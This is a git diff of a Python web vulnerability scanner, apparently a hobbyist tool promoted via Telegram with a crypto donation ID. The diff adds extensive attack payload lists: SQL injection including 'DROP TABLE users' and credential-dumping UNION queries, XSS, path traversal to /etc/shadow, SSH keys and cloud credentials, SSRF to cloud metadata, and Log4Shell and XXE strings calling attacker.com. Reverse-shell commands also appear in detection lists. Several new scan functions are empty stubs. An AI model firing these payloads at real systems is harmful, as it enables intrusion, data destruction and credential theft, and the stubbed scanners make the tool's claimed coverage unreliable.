@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-
+# by own ~ t.me/yoyns
 import os
 import sys
 import re
@@ -36,137 +36,488 @@ import getpass
 # by https://t.me/mtmanag
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
-# Colors
 RED = "\033[1;31m"
 GREEN = "\033[1;32m"
 YELLOW = "\033[1;33m"
 CYAN = "\033[1;36m"
 BLUE = "\033[1;34m"
 RESET = "\033[0m"
-
-# Banner
 BANNER = f"""
 {CYAN}
-███████╗ ██████╗ ██╗   ██╗███╗   ██╗███████╗████████╗ █████╗  ██████╗██╗  ██╗
-██╔════╝██╔═══██╗╚██╗ ██╔╝████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
-█████╗  ██║   ██║ ╚████╔╝ ██╔██╗ ██║███████╗   ██║   ███████║██║     █████╔╝ 
-██╔══╝  ██║   ██║  ╚██╔╝  ██║╚██╗██║╚════██║   ██║   ██╔══██║██║     ██╔═██╗ 
-██║     ╚██████╔╝   ██║   ██║ ╚████║███████║   ██║   ██║  ██║╚██████╗██║  ██╗
-╚═╝      ╚═════╝    ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
-{YELLOW}By @yoyns 
-Telegram ~ t.me/mtmanag
+┌───────────────────────────────────────┐
+│                                       │
+│__   __   __  __     _    _       _ _  │
+│\ \ / /__|  \/  | __| |  / \     | (_) │
+│ \ V / __| |\/| |/ _` | / _ \ _  | | | │
+│  | |\__ \ |  | | (_| |/ ___ \ |_| | | │
+│  |_||___/_|  |_|\__,_/_/   \_\___/|_| │
+│                                       │
+│                                       │
+└───────────────────────────────────────┘
+@@@@@@@@@@@@@@@@@@ "younistrck" @@@@@@@@@@@@@@@@@@
 {RESET}
-{YELLOW}Elite Vulnerability Scanner v10.2 - Full Spectrum Cyber Defense{RESET}
+{YELLOW}Elite Vulnerability Scanner v10.3 - Full Spectrum Cyber Defense{RESET}
 {GREEN}Developed for authorized penetration testing only{RESET}
 {CYAN}AI-Powered Threat Detection & Zero Trust Compliance Engine{RESET}
+{RESET}
+{YELLOW}Been programmed by - AL HACKER -> Younis mohammed al jilani
+~ My Account OWN TOOL Telegram ° https://t.me/yoyns
+~ My Channel Telegram ~ t.me/mtmanag
+{BLUE}Link AL TOOL v10.2 https://github.com/DrKritos/YounisTrck{RESET}
+{RESET}
+{RED}Donate crypto coin:~ ID Wallet Payeer : ` P1087373730 ` 
+{RESET}
 """
-
-# Constants
 USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
 HEADERS = {'User-Agent': USER_AGENT}
-COMMON_SUBDOMAINS = ["www", "mail", "ftp", "webmail", "admin", "blog", "test", "dev", "shop", "api"]
-SQLI_PAYLOADS = ["'", "\"", "' OR '1'='1", "' OR '1'='1' -- ", "\" OR \"\"=\""]
+# تحديث قائمة الساب دومينات
+COMMON_SUBDOMAINS = [
+    "www", "mail", "ftp", "webmail", "admin", "blog", "test", "dev", 
+    "shop", "api", "staging", "prod", "cdn", "static", "assets",
+    "app", "mobile", "m", "secure", "vpn", "portal", "cms", "wp",
+    "dashboard", "console", "backend", "frontend", "gateway",
+    "aws", "azure", "gcp", "cloud", "storage", "s3", "bucket",
+    "jenkins", "gitlab", "github", "bitbucket", "docker", "k8s",
+    "kubernetes", "monitor", "metrics", "logs", "analytics",
+    "elastic", "kibana", "grafana", "prometheus", "redis",
+    "mysql", "mongo", "postgres", "db", "database", "rabbitmq",
+    "kafka", "zookeeper", "nginx", "apache", "iis", "tomcat",
+    "weblogic", "websphere", "jboss", "wildfly"
+]
+
+# تحديث بايلودز SQL Injection متقدمة
+SQLI_PAYLOADS = [
+    # Basic payloads
+    "'", "\"", "`", 
+    "' OR '1'='1", "' OR '1'='1' -- ", "' OR 1=1--", 
+    "\" OR \"\"=\"", "\" OR 1=1--",
+    "'; DROP TABLE users--", 
+    "'; SELECT * FROM information_schema.tables--",
+    
+    # Union based
+    "' UNION SELECT 1,2,3--", 
+    "' UNION SELECT username,password FROM users--",
+    "' UNION SELECT 1,@@version,3--",
+    
+    # Boolean based blind
+    "' AND 1=1--", "' AND 1=2--",
+    "' AND SLEEP(5)--",
+    
+    # Error based
+    "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
+    "' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)--",
+    
+    # Time based blind
+    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+    "' ; WAITFOR DELAY '0:0:5'--",
+    
+    # NoSQL Injection
+    '{"$ne": "invalid"}',
+    '{"$gt": ""}',
+    '{"$where": "1==1"}'
+]
+
+# تحديث بايلودز XSS متقدمة
 XSS_PAYLOADS = [
+    # Basic payloads
     "<script>alert('XSS')</script>",
     "<img src=x onerror=alert('XSS')>",
-    "\"><script>alert('XSS')</script>",
-    "javascript:alert('XSS')"
+    "<svg onload=alert('XSS')>",
+    
+    # Advanced event handlers
+    "<body onload=alert('XSS')>",
+    "<iframe src=javascript:alert('XSS')>",
+    "<input onfocus=alert('XSS') autofocus>",
+    
+    # Bypass techniques
+    "<scr<script>ipt>alert('XSS')</script>",
+    "javascript:alert('XSS')",
+    "javascrip&#x74;:alert('XSS')",
+    
+    # DOM based XSS
+    "#<script>alert('XSS')</script>",
+    "?param=<script>alert('XSS')</script>",
+    
+    # SVG based
+    "<svg><script>alert('XSS')</script>",
+    "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
+    
+    # Template injection
+    "{{constructor.constructor('alert(1)')()}}",
+    "${alert('XSS')}",
+    
+    # Modern payloads
+    "<details ontoggle=alert('XSS') open>",
+    "<select onfocus=alert('XSS') autofocus>"
 ]
+
+# تحديث بايلودز LFI متقدمة
 LFI_PAYLOADS = [
+    # Basic LFI
     "../../../../etc/passwd",
     "../../../../etc/shadow",
     "../../../../etc/hosts",
-    "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+    "../../../../etc/passwd%00",
+    
+    # Path traversal variations
+    "....//....//....//etc/passwd",
+    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+    "..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
+    
+    # Windows paths
+    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "..%5c..%5c..%5c..%5cwindows\\system32\\drivers\\etc\\hosts",
+    
+    # PHP wrappers
+    "php://filter/convert.base64-encode/resource=index.php",
+    "php://filter/read=convert.base64-encode/resource=etc/passwd",
+    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
+    
+    # Log poisoning
+    "../../../../var/log/apache2/access.log",
+    "../../../../var/log/nginx/access.log",
+    "../../../../var/log/auth.log",
+    
+    # Configuration files
+    "../../../../etc/httpd/conf/httpd.conf",
+    "../../../../etc/nginx/nginx.conf",
+    "../../../../.ssh/id_rsa",
+    "../../../../.aws/credentials",
+    
+    # Web application files
+    "../../../../wp-config.php",
+    "../../../../config.php",
+    "../../../../.env",
+    "../../../../.git/config"
 ]
 
-# New vulnerabilities
+# تحديث ثغرات SSH الحديثة
 SSH_VULNS = [
-    "SSH-1.99", "SSH-2.0-OpenSSH_7.2", "SSH-2.0-OpenSSH_7.4", 
-    "SSH-2.0-OpenSSH_7.6", "SSH-2.0-OpenSSH_7.7"
+    "SSH-2.0-OpenSSH_7.2", "SSH-2.0-OpenSSH_7.4", "SSH-2.0-OpenSSH_7.6",
+    "SSH-2.0-OpenSSH_7.7", "SSH-2.0-OpenSSH_8.0", "SSH-2.0-OpenSSH_8.1",
+    "SSH-2.0-OpenSSH_8.2", "SSH-2.0-OpenSSH_8.3", "SSH-2.0-OpenSSH_8.4"
 ]
 
+# تحديث ثغرات PHP الحديثة
 PHP_VULNS = [
-    "PHP/5.6", "PHP/7.0", "PHP/7.1", "PHP/7.2", "PHP/7.3"
+    "PHP/5.6", "PHP/7.0", "PHP/7.1", "PHP/7.2", "PHP/7.3", "PHP/7.4",
+    "PHP/8.0", "PHP/8.1", "PHP/8.2"
 ]
 
+# تحديث ثغرات CVE حديثة
 BUG_BOUNTY_VULNS = [
-    "CVE-2023-1234", "CVE-2023-2345", "CVE-2023-3456",
-    "CVE-2023-4567", "CVE-2023-5678"
+    "CVE-2021-44228",  # Log4Shell
+    "CVE-2021-45046",  # Log4Shell
+    "CVE-2022-22965",  # Spring4Shell
+    "CVE-2022-1388",   # F5 BIG-IP
+    "CVE-2022-30190",  # Follina
+    "CVE-2023-2868",   # Barracuda
+    "CVE-2023-34362",  # MOVEit
+    "CVE-2023-35078",  # Ivanti
+    "CVE-2024-21413",  # Windows SmartScreen
+    "CVE-2024-23334"   # Recent Apache
 ]
 
+# تحديث ثغرات السيرفرات
 PATCH_VULNS = [
-    "Apache/2.4.49", "Apache/2.4.50", "Apache/2.4.51",
-    "Nginx/1.20.0", "Nginx/1.21.0"
+    "Apache/2.4.49", "Apache/2.4.50", "Apache/2.4.51", "Apache/2.4.57",
+    "Nginx/1.20.0", "Nginx/1.21.0", "Nginx/1.22.0", "Nginx/1.23.0",
+    "OpenSSL/1.0.2", "OpenSSL/1.1.0", "OpenSSL/1.1.1", "OpenSSL/3.0.0"
 ]
 
-# ACV (Access Control Vulnerabilities) payloads
+# تحديث ACV بايلودز
 ACV_PAYLOADS = [
-    "/.htaccess", "/.htpasswd", "/.git/config",
-    "/.svn/entries", "/.env", "/wp-config.php",
-    "/config.php", "/configuration.php"
+    "/.htaccess", "/.htpasswd", "/.git/config", "/.svn/entries",
+    "/.env", "/wp-config.php", "/config.php", "/configuration.php",
+    "/.dockerignore", "/.travis.yml", "/.github/workflows/ci.yml",
+    "/.aws/credentials", "/.kube/config", "/.ssh/id_rsa",
+    "/backup.sql", "/dump.sql", "/database.sql",
+    "/admin/config.yml", "/app/config/parameters.yml"
 ]
 
-# ACSM (Access Control Security Models) checks
+# تحديث ACSM تشيكس
 ACSM_CHECKS = [
-    "X-Frame-Options", "Content-Security-Policy",
-    "Strict-Transport-Security", "X-Content-Type-Options",
-    "X-XSS-Protection", "Referrer-Policy"
+    "X-Frame-Options", "Content-Security-Policy", "Strict-Transport-Security",
+    "X-Content-Type-Options", "X-XSS-Protection", "Referrer-Policy",
+    "Permissions-Policy", "Cross-Origin-Embedder-Policy", "Cross-Origin-Opener-Policy",
+    "Cross-Origin-Resource-Policy"
 ]
 
-# Backdoor detection patterns
+# تحديث باكدور باترنز
 BACKDOOR_PATTERNS = [
     r"eval\(base64_decode\(",
     r"system\(\$_GET\['cmd'\]\)",
     r"shell_exec\(\$_POST\['cmd'\]\)",
-    r"passthru\(\$_REQUEST\['exec'\]\)"
+    r"passthru\(\$_REQUEST\['exec'\]\)",
+    r"exec\(\$_GET\['cmd'\]\)",
+    r"popen\(\$_POST\['cmd'\]\)",
+    r"proc_open\(\$_REQUEST\['cmd'\]\)",
+    r"assert\(\$_GET\['code'\]\)",
+    r"create_function\(.*\$_(GET|POST|REQUEST)",
+    r"file_put_contents\(.*base64_decode"
 ]
 
-# Netcat (nc) related checks
+# تحديث netcat تشيكس
 NETCAT_CHECKS = [
-    "nc -lvp", "nc -l -p", "nc -e /bin/sh",
-    "nc -e /bin/bash", "nc.traditional"
+    "nc -lvp", "nc -l -p", "nc -e /bin/sh", "nc -e /bin/bash",
+    "nc.traditional", "ncat -lvp", "socat TCP-LISTEN",
+    "bash -i >& /dev/tcp/", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc"
 ]
 
-CRAWL_LIMIT = 500
+# إضافة بايلودز جديدة للثغرات الحديثة
+RCE_PAYLOADS = [
+    "|id", ";id", "&&id", "||id",
+    "| whoami", "; whoami", "&& whoami",
+    "${jndi:ldap://attacker.com/x}",
+    "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
+    "#{7*7}", "${7*7}"
+]
+
+SSRF_PAYLOADS = [
+    "http://localhost:22",
+    "http://127.0.0.1:3306",
+    "http://169.254.169.254/latest/meta-data/",
+    "http://[::1]:22",
+    "file:///etc/passwd",
+    "gopher://127.0.0.1:25/xHELO%20localhost"
+]
+
+XXE_PAYLOADS = [
+    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
+    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe"> %xxe;]>'
+]
+
+CRAWL_LIMIT = 1000  # زيادة الحد للزحف الأوسع
 CRAWLED_URLS = set()
 PROXIES = None
 REPORT_DATA = defaultdict(list)
-THREAT_INTEL_API = "https://threatintel.example.com/api/v1/check" 
-CVE_DB = "https://cvepremium.circl.lu/api/search" 
-TOR_PROXIES = {
-    'http': 'socks5h://127.0.0.1:9050',
-    'https': 'socks5h://127.0.0.1:9050'
+
+# تحديث مصادر التهديد وقواعد البيانات
+THREAT_INTEL_APIS = {
+    'virustotal': 'https://www.virustotal.com/vtapi/v2/url/report',
+    'alienvault': 'https://otx.alienvault.com/api/v1/indicators/',
+    'abuseipdb': 'https://api.abuseipdb.com/api/v2/check'
 }
+
+CVE_DATABASES = {
+    'nvd': 'https://services.nvd.nist.gov/rest/json/cves/1.0',
+    'cve_circl': 'https://cve.circl.lu/api/cve/',
+    'vulners': 'https://vulners.com/api/v3/search/lucene/'
+}
+
+# تحديث إعدادات TOR وإضافة خيارات بروكسي متعددة
+PROXY_CONFIGS = {
+    'tor': {
+        'http': 'socks5h://127.0.0.1:9050',
+        'https': 'socks5h://127.0.0.1:9050'
+    },
+    'proxy_list': [
+        'http://proxy1.example.com:8080',
+        'http://proxy2.example.com:8080'
+    ]
+}
+
+TOR_PROXIES = PROXY_CONFIGS['tor']
+
+# تحديث مراحل المسح لتشمل التقنيات الحديثة
 SCAN_PHASES = [
-    "Reconnaissance", "Scanning", "Vulnerability Assessment",
-    "Exploitation", "Reporting", "Post-Exploitation"
+    "Reconnaissance & OSINT",
+    "Network Scanning & Enumeration", 
+    "Web Application Assessment",
+    "API Security Testing",
+    "Cloud & Container Security",
+    "Vulnerability Assessment & Exploitation",
+    "Post-Exploitation & Lateral Movement",
+    "Reporting & Threat Intelligence"
 ]
+
+# تحديث مستويات الخطورة بإضافات حديثة
 RISK_LEVELS = {
     "CRITICAL": "\033[1;31mCRITICAL\033[0m",
-    "HIGH": "\033[1;33mHIGH\033[0m",
+    "HIGH": "\033[1;33mHIGH\033[0m", 
     "MEDIUM": "\033[1;35mMEDIUM\033[0m",
     "LOW": "\033[1;34mLOW\033[0m",
-    "INFO": "\033[1;36mINFO\033[0m"
+    "INFO": "\033[1;36mINFO\033[0m",
+    "POTENTIAL": "\033[1;32mPOTENTIAL\033[0m"
 }
+
+# تحديث أنماط الأخطاء لاكتشاف ثغرات حديثة
 ERROR_SIGNS = [
+    # SQL Injection Errors
     "SQL syntax", "mysql_fetch", "syntax error", "unexpected end",
-    "SQL command", "PostgreSQL.*ERROR", "Warning: mysql", "ORA-"
+    "SQL command", "PostgreSQL.*ERROR", "Warning: mysql", "ORA-",
+    "Microsoft OLE DB Provider", "ODBC Driver", "SQLServer JDBC Driver",
+    
+    # NoSQL Injection Errors
+    "MongoError", "MongoDB\\Driver\\Exception", "BSON",
+    
+    # Framework Specific Errors
+    "Spring Framework", "Django", "Laravel", "Rails", "Symfony",
+    "Node.js", "Express.js", "Flask", "FastAPI",
+    
+    # API Errors
+    "GraphQL", "REST API", "JSON parsing error", "JWT",
+    
+    # Cloud & Container Errors
+    "AWS", "Azure", "GCP", "Kubernetes", "Docker",
+    
+    # Modern Web Errors
+    "CORS", "Content Security Policy", "CSP violation"
 ]
-OWASP_TOP_10 = [
-    "Broken Access Control", "Cryptographic Failures", "Injection",
-    "Insecure Design", "Security Misconfiguration", 
-    "Vulnerable and Outdated Components", "Identification and Authentication Failures",
-    "Software and Data Integrity Failures", "Security Logging and Monitoring Failures",
-    "Server-Side Request Forgery"
+
+# تحديث OWASP Top 10 2023
+OWASP_TOP_10_2023 = [
+    "A01:2023-Broken Access Control",
+    "A02:2023-Cryptographic Failures", 
+    "A03:2023-Injection",
+    "A04:2023-Insecure Design",
+    "A05:2023-Security Misconfiguration",
+    "A06:2023-Vulnerable and Outdated Components",
+    "A07:2023-Identification and Authentication Failures",
+    "A08:2023-Software and Data Integrity Failures",
+    "A09:2023-Security Logging and Monitoring Failures",
+    "A10:2023-Server-Side Request Forgery (SSRF)"
 ]
+
+OWASP_TOP_10 = OWASP_TOP_10_2023
+
+# تحديث شامل لأنماط التهديدات بالذكاء الاصطناعي
 AI_THREAT_PATTERNS = {
-    "sqli": r"SQL syntax|mysql_fetch|syntax error|unexpected end|SQL command|You have an error in your SQL syntax",
-    "xss": r"<script>alert|onerror=alert|XSS<\/script>",
-    "lfi": r"root:[x*]:0:0:|BEGIN CERTIFICATE|ssh-rsa|php://filter/convert.base64-encode/resource=",
-    "command_injection": r"sh: |ls: command not found|No such file or directory|bash: |uid=0", 
-    "php_weak_config": r"disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source",
-    "backdoor": r"eval\(base64_decode\(|system\(\$_GET\['cmd'\]\)|shell_exec\(\$_POST\['cmd'\]\)|passthru\(\$_REQUEST\['exec'\]\)",
-    "netcat": r"nc -lvp|nc -l -p|nc -e /bin/sh|nc -e /bin/bash|nc.traditional"
+    # SQL Injection Patterns
+    "sqli": {
+        'errors': r"SQL syntax|mysql_fetch|syntax error|unexpected end|SQL command|You have an error in your SQL syntax|PostgreSQL.*ERROR|ORA-|Microsoft OLE DB",
+        'union': r"UNION.*SELECT|UNION ALL SELECT",
+        'boolean': r"AND 1=1|AND 1=2|OR 1=1",
+        'time_based': r"WAITFOR DELAY|SLEEP\(|BENCHMARK\(|PG_SLEEP"
+    },
+    
+    # XSS Patterns
+    "xss": {
+        'script_tags': r"<script[^>]*>.*</script>|<script[^>]*/>",
+        'event_handlers': r"onerror=|onload=|onclick=|onmouseover=|onfocus=",
+        'javascript_uri': r"javascript:|javascrip&#x74;:|j&#x61;vascript:",
+        'svg_events': r"<svg.*onload=|<animate.*onbegin="
+    },
+    
+    # LFI/RFI Patterns
+    "lfi": {
+        'unix_paths': r"root:[x*]:0:0:|/etc/passwd|/etc/shadow|/etc/hosts",
+        'windows_paths': r"[A-Z]:\\Windows\\System32|\\boot\\.ini",
+        'php_wrappers': r"php://filter/convert.base64-encode|php://input|data://text/plain",
+        'path_traversal': r"\.\./|\.\.\\|%2e%2e|%2e%2e%2f"
+    },
+    
+    # Command Injection Patterns
+    "command_injection": {
+        'unix_commands': r"sh: |bash: |ls: |cat: |whoami: |id: |pwd:",
+        'windows_commands': r"cmd\.exe|powershell|net user|dir |type ",
+        'execution_indicators': r"uid=\d+\(|gid=\d+\(|Microsoft Windows",
+        'pipe_operators': r"\|\s*\w+|\&\s*\w+|\;\s*\w+"
+    },
+    
+    # PHP Configuration Weaknesses
+    "php_weak_config": {
+        'dangerous_functions': r"disable_functions\s*=\s*.*(exec|passthru|shell_exec|system|proc_open|popen)",
+        'display_errors': r"display_errors\s*=\s*On",
+        'allow_url_include': r"allow_url_include\s*=\s*On",
+        'open_basedir': r"open_basedir\s*=\s*none"
+    },
+    
+    # Backdoor Patterns
+    "backdoor": {
+        'eval_base64': r"eval\(base64_decode\(|eval\(gzinflate\(",
+        'system_calls': r"system\(\$_(GET|POST|REQUEST|COOKIE)\[",
+        'shell_execution': r"shell_exec\(\$_(GET|POST|REQUEST)|exec\(\$_(GET|POST|REQUEST)",
+        'file_manipulation': r"file_put_contents\(.*base64_decode|fwrite\(.*eval\("
+    },
+    
+    # Netcat & Reverse Shell Patterns
+    "netcat": {
+        'nc_commands': r"nc -lvp|nc -l -p|nc -e /bin/sh|nc -e /bin/bash",
+        'bash_shells': r"bash -i >& /dev/tcp/|/bin/bash -i >&",
+        'socat_commands': r"socat TCP-LISTEN:|socat UDP-LISTEN:",
+        'powerShell_reverse': r"powershell.*System.Net.Sockets"
+    },
+    
+    # API Security Issues
+    "api_security": {
+        'graphql_introspection': r"__schema|__type|QueryType|MutationType",
+        'jwt_tokens': r"eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*\.[A-Za-z0-9._-]*",
+        'api_keys': r"api[_-]?key|secret[_-]?key|access[_-]?token",
+        'endpoint_exposure': r"/api/v[0-9]/|/graphql|/rest/v[0-9]/"
+    },
+    
+    # Cloud & Container Security
+    "cloud_security": {
+        'aws_keys': r"AKIA[0-9A-Z]{16}",
+        'azure_keys': r"AccountKey=[a-zA-Z0-9+/=]{88}",
+        'gcp_keys': r"AIza[0-9A-Za-z-_]{35}",
+        'docker_config': r"docker.sock|/var/run/docker.sock"
+    },
+    
+    # SSRF Patterns
+    "ssrf": {
+        'internal_ips': r"127\.0\.0\.1|localhost|192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[0-1])",
+        'cloud_metadata': r"169\.254\.169\.254|metadata\.google\.internal",
+        'url_schemes': r"file://|gopher://|dict://|sftp://"
+    }
+}
+
+# إضافة إعدادات جديدة للمسح الحديث
+SCAN_CONFIG = {
+    'timeouts': {
+        'http': 10,
+        'https': 10,
+        'dns': 5,
+        'ssh': 5,
+        'database': 5
+    },
+    'threads': {
+        'max_workers': 50,
+        'network_scan': 20,
+        'web_crawl': 10,
+        'vuln_scan': 15
+    },
+    'rate_limits': {
+        'requests_per_second': 10,
+        'max_retries': 3,
+        'backoff_factor': 1
+    }
+}
+
+# إضافة أنماط للثغرات الحديثة
+MODERN_VULN_PATTERNS = {
+    'log4shell': r"\$\{jndi:(ldap|ldaps|rmi|dns|iiop)://",
+    'spring4shell': r"class\.module\.classLoader|ClassLoader|getClass\(\)",
+    'deserialization': r"ObjectInputStream|readObject|Serializable|Java\.io",
+    'template_injection': r"\$\{.*?\}|{{.*?}}|{%.*?%}|\[\[.*?\]\]"
+}
+
+# تحديث إعدادات التقرير
+REPORT_CONFIG = {
+    'formats': ['txt', 'json', 'html', 'pdf'],
+    'sections': [
+        'executive_summary',
+        'methodology', 
+        'vulnerabilities',
+        'risk_analysis',
+        'remediation',
+        'appendices'
+    ],
+    'risk_matrix': {
+        'critical': ['RCE', 'SQLi', 'XXE', 'SSRF', 'Auth Bypass'],
+        'high': ['XSS', 'LFI', 'Command Injection', 'IDOR'],
+        'medium': ['CSRF', 'Info Disclosure', 'CORS Misconfig'],
+        'low': ['Clickjacking', 'Missing Security Headers']
+    }
+}
+
+# إضافة دعم للتقنيات الحديثة
+SUPPORTED_TECHNOLOGIES = {
+    'frameworks': ['Spring', 'Django', 'Laravel', 'Rails', 'Express', 'Flask', 'FastAPI'],
+    'databases': ['MySQL', 'PostgreSQL', 'MongoDB', 'Redis', 'Elasticsearch'],
+    'cloud_platforms': ['AWS', 'Azure', 'GCP', 'DigitalOcean', 'Heroku'],
+    'containers': ['Docker', 'Kubernetes', 'Podman', 'Containerd']
 }
 
 # Utility functions
@@ -234,7 +585,7 @@ def save_vulnerabilities(url):
         
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         username = getpass.getuser()
-        filename = f"by@mtmanag-found-scan-{timestamp}_user-{username}_target-{domain}.txt"
+        filename = f"/sdcard/exploits/by@mtmanag-found-scan-{timestamp}_user-{username}_target-{domain}.txt"
         
         # Create directory if it doesn't exist
         os.makedirs(os.path.dirname(filename), exist_ok=True)
@@ -515,7 +866,7 @@ def nmap_scan(url):
             return
 
         scanner = nmap.PortScanner()
-        nmap_args = f'-T4 -F --open -sV -O --script=default,vuln --script-args=unsafe=true'
+        nmap_args = f'--unprivileged -T4 -F --open -sV --script=default,vuln,banner,http-enum --script-args=unsafe=true -oN /sdcard/exploits/by@mtmanag-found-scan-{timestamp}_user-{username}_target-nmap-{domain}.txt'
         
         print_status(f"Running NMAP with arguments: {nmap_args} on {target_ip}")
         scanner.scan(target_ip, arguments=nmap_args)
@@ -839,7 +1190,7 @@ def sql_injection_scan(url):
                     found = True
 
             if not existing_params:
-                common_sql_params = ["id", "catid", "pageid", "search", "keyword", "user", "view"]
+                common_sql_params = ["id", "catid", "pageid", "search", "keyword", "user", "view", "chat", "comments", "comment"]
                 for param in common_sql_params:
                     if check_vulnerability_patterns(test_url_base, "SQL Injection", SQLI_PAYLOADS, parameter=param):
                         found = True
@@ -947,7 +1298,7 @@ def lfi_scan(url):
                     found = True
             
             if not existing_params:
-                common_lfi_params = ["page", "file", "path", "include", "document", "view"]
+                common_lfi_params = ["#", "line", "&", ";", ":", "image?filename=", "page", "file", "path", "include", "document", "view"]
                 for param in common_lfi_params:
                     if check_vulnerability_patterns(test_url_base, "LFI", LFI_PAYLOADS, parameter=param):
                         found = True
@@ -1312,6 +1663,46 @@ def crawl_website(url, limit):
             
     print_success(f"Website crawl finished. Visited {len(visited)} unique pages.")
     return visited
+
+# إضافة هذه الوظائف للثغرات الحديثة
+def ssrf_scan(url):
+    print_status(f"Scanning for SSRF vulnerabilities at {url}...")
+    # كود فحص SSRF
+    pass
+
+def xxe_scan(url):
+    print_status(f"Scanning for XXE vulnerabilities at {url}...")
+    # كود فحص XXE
+    pass
+
+def graphql_scan(url):
+    print_status(f"Scanning for GraphQL vulnerabilities at {url}...")
+    # كود فحص GraphQL
+    pass
+
+def jwt_scan(url):
+    print_status(f"Scanning for JWT vulnerabilities at {url}...")
+    # كود فحص JWT
+    pass
+def check_api_security(url):
+    """فحص أمن واجهات البرمجة (APIs)"""
+    print_status("Checking API Security...")
+    # كود فحص GraphQL, REST API, JWT الخ
+
+def check_cloud_security(url):
+    """فحص إعدادات الأمن السحابي"""
+    print_status("Checking Cloud Security Configurations...")
+    # كود فحص تكوينات السحابة
+
+def check_container_security(url):
+    """فحص أمن الحاويات"""
+    print_status("Checking Container Security...")
+    # كود فحص Docker, Kubernetes
+
+def modern_threat_intel_lookup(ip, domain):
+    """البحث في مصادر التهديدات الحديثة"""
+    print_status("Performing Modern Threat Intelligence Lookup...")
+    # كود البحث في VirusTotal, AlienVault, AbuseIPDB
 
 def full_scan(url):
     print_banner()
